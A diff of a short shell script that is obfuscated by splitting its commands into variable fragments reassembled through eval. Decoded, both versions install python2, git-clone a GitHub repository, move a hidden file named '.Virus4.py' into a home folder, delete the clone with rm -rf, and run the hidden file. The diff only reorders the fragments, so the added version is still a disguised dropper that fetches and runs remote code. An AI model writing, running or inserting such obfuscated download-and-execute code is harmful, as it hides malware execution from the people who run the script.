@@ -1,3 +1,3 @@
 z="
-";ez='rf ~';kz='s4.p';Mz='tps:';Uz='/H-C';cz='era/';Lz='e ht';Vz='amer';Gz='on2 ';Cz='apt ';fz='l';Bz='r';Wz='a/Lo';lz='y';Hz='-y';Nz='//gi';Rz='nVb/';gz='~/H-';az=' ~/H';Xz='l/.V';dz='rm -';iz='ra/.';Kz='clon';Zz='4.py';Qz='/Aka';Pz='.com';Sz='Lol';hz='Came';Dz='inst';Oz='thub';Ez='all ';Az='clea';Iz='cd';bz='-Cam';Yz='irus';Jz='git ';Fz='pyth';Tz='mv ~';jz='Viru';
-eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$Hz$z$Iz$z$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$z$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$z$dz$ez$Uz$Vz$Wz$fz$z$Fz$Gz$gz$hz$iz$jz$kz$lz"
+";iz='Viru';Vz='a/.V';Gz='on2 ';Tz='/H-C';cz='rf ~';Wz='irus';Nz='thub';jz='s4.p';Ez='all ';Pz='/Aka';Bz='r';Fz='pyth';Az='clea';bz='rm -';Cz='apt ';Sz='mv ~';Yz=' ~/H';Xz='4.py';Mz='//gi';Uz='amer';Lz='tps:';dz='a/Lo';Iz='git ';Oz='.com';az='era/';Zz='-Cam';Jz='clon';Hz='-y';Kz='e ht';kz='y';Rz='Lol';gz='Came';fz='~/H-';Dz='inst';Qz='nVb/';hz='ra/.';ez='l';
+eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$Hz$z$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$z$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$z$bz$cz$Tz$Uz$dz$ez$z$Fz$Gz$fz$gz$hz$iz$jz$kz"
